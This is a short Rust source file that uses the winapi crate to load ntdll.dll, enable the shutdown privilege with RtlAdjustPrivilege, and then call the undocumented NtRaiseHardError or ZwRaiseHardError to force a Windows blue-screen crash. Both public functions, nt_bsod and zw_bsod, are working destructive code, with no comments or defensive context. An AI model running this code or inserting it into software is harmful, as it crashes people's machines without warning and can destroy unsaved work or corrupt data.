use winapi::ctypes::c_ulong;
use winapi::shared::minwindef::{HMODULE, ULONG};
use winapi::shared::ntdef::{NTSTATUS, BOOLEAN};
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use std::ffi::CString;


const SHUTDOWN_PRIVILEGE: ULONG = 19;
const OPTION_SHUTDOWN: ULONG = 6;

type RtlAdjustPrivilegeFn = unsafe extern "system" fn(
    privilege: ULONG,
    enable: BOOLEAN,
    current_thread: BOOLEAN,
    enabled: *mut BOOLEAN,
) -> NTSTATUS;

type NtRaiseHardErrorFn = unsafe extern "system" fn(
    error_status: NTSTATUS,
    number_of_parameters: ULONG,
    unicode_string_parameter_mask: ULONG,
    parameters: *mut c_ulong,
    response_option: ULONG,
    response: *mut ULONG,
) -> NTSTATUS;

type ZwRaiseHardErrorFn = unsafe extern "system" fn(
    error_status: NTSTATUS,
    number_of_parameters: ULONG,
    unicode_string_parameter_mask: ULONG,
    parameters: *mut c_ulong,
    response_option: ULONG,
    response: *mut ULONG,
) -> NTSTATUS;

pub fn nt_bsod() {
    unsafe {
        let ntdll: HMODULE = LoadLibraryA(CString::new("ntdll.dll").unwrap().as_ptr());

        let rtl_adjust_privilege: RtlAdjustPrivilegeFn = std::mem::transmute(GetProcAddress(
            ntdll,
            CString::new("RtlAdjustPrivilege").unwrap().as_ptr(),
        ));

        let mut enabled: BOOLEAN = 0;
        if rtl_adjust_privilege(SHUTDOWN_PRIVILEGE, 1, 0, &mut enabled) == 0 {
            let nt_raise_hard_error: NtRaiseHardErrorFn = std::mem::transmute(GetProcAddress(
                ntdll,
                CString::new("NtRaiseHardError").unwrap().as_ptr(),
            ));

            let mut response: ULONG = 0;
            nt_raise_hard_error(0xC0000002u32 as i32, 0, 0, std::ptr::null_mut(), OPTION_SHUTDOWN, &mut response);
        }
    }
}

pub fn zw_bsod() {
    unsafe {
        let ntdll: HMODULE = LoadLibraryA(CString::new("ntdll.dll").unwrap().as_ptr());

        let rtl_adjust_privilege: RtlAdjustPrivilegeFn = std::mem::transmute(GetProcAddress(
            ntdll,
            CString::new("RtlAdjustPrivilege").unwrap().as_ptr(),
        ));

        let mut enabled: BOOLEAN = 0;
        if rtl_adjust_privilege(SHUTDOWN_PRIVILEGE, 1, 0, &mut enabled) == 0 {
            let zw_raise_hard_error: ZwRaiseHardErrorFn = std::mem::transmute(GetProcAddress(
                ntdll,
                CString::new("ZwRaiseHardError").unwrap().as_ptr(),
            ));

            let mut response: ULONG = 0;
            zw_raise_hard_error(0xC0000002u32 as i32, 0, 0, std::ptr::null_mut(), OPTION_SHUTDOWN, &mut response);
        }
    }
}